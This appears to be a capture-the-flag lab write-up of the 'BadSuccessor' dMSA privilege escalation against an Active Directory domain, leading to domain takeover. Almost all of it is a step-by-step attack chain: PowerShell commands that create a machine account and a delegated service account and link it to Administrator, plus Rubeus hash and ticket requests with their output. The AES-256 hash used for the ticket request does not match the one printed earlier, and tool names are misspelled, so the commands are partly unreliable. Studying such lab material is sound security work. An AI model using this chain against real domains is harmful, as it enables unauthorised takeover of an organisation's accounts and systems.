#PrivEsc 
this attack require a user that has create child ACE enabled. which leads to domain takeover 


## exploit
first we need to identify the the user that has this permission which is by running `Get-BadSuccessorOUPermissions.ps1` 

second after identify the user, we create a new machine
```powershell
New-ADComputer -Name PwnedMachine -SamAccountName "PwnedMachine" -AccountPassword (ConvertTo-SecureString -String "P@ssw0rd" -AsPlainText -Force) -Enabled $true -Path "OU=Staff,DC=eighteen,DC=htb" -PassThru -Server "DC01"

# -Path is the OU that we have control over from the script that we run earlier
```

next we need the AES-256 hash of that computer using `rubues`
```powershell
.\Rubeus.exe hash /password:P@ssw0rd /user:PwnedMachine$ /domain:eighteen.htb

PS C:\Users\adam.scott\Desktop> .\Rubeus.exe hash /password:P@ssw0rd /user:PwnedMachine$ /domain:eighteen.htb
 

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Calculate Password Hash(es)

[*] Input password             : P@ssw0rd
[*] Input username             : PwnedMachine$
[*] Input domain               : eighteen.htb
[*] Salt                       : EIGHTEEN.HTBhostpwnedmachine.eighteen.htb
[*]       rc4_hmac             : E19CCF75EE54E06B06A5907AF13CEF42
[*]       aes128_cts_hmac_sha1 : 7BB3687E36D878390F3876E9431CB604
[*]       aes256_cts_hmac_sha1 : 07B4672FCC9800C8F377756BA28FF3AEA1E9A445E103DC3672D246BD7D4F0FA9
[*]       des_cbc_md5          : E516312CA410E6C2


```

next we create `dMSA` account, we will user `New-ADServiceAccount` from `AdModule` by `import-module ActiveDirectory`

```powershell
New-ADServiceAccount -name "Pwned_DMSA" -DNSHostName "eighteen.htb" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "PwnedMachine$" -path "OU=Staff,DC=eighteen,DC=htb"
```

next we set permissions on the new `dMSA` to allow our user to have access to it
```powershell
# 1. Get SID of the principal who should control the dMSA
$sid = (Get-ADUser -Identity "PwnedMachine$").SID

# 2. Load the ACL of the dMSA object
$acl = Get-Acl "AD:\CN=Pwned_DMSA,OU=Staff,DC=eighteen,DC=htb"

# 3. Create a rule granting GenericAll (full control)
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"

# 4. Apply the rule
$acl.AddAccessRule($rule)

# 5. Write updated ACL back to AD
Set-Acl -Path "AD:\CN=Pwned_DMSA,OU=Staff,DC=eighteen,DC=htb" -AclObject $acl

```



next we need to write to two parameters: `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` 
```powershell
Set-ADServiceAccount -Identity Pwned_DMSA -Replace @{
    'msDS-ManagedAccountPrecededByLink' = 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'
    'msDS-DelegatedMSAState' = 2
}

# to check:
Get-ADServiceAccount -Identity Pwned_DMSA -Properties msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState
```

Next we will just use all of this to request a ticket as the machine account that we created earlier `pwnedmachine`
```powershell
.\Rubeus.exe asktgt /user:PwnedMachine$ /aes256:35647A39BCB6EE786AF376156F4BDEDEEEC4755EC4BAC23A0994E6AC5A4259C /domain:eighteen.htb /nowrap
```

then gets the TGS:
```powershell
.\Rubues.exe asktgs /targetuser:Pwned_DMSA$ /service:krbtgt/eighteen.htb /dmsa /opsec /nowrap /ticket:<TICKET>
```


or just use `sharpsuccessor`
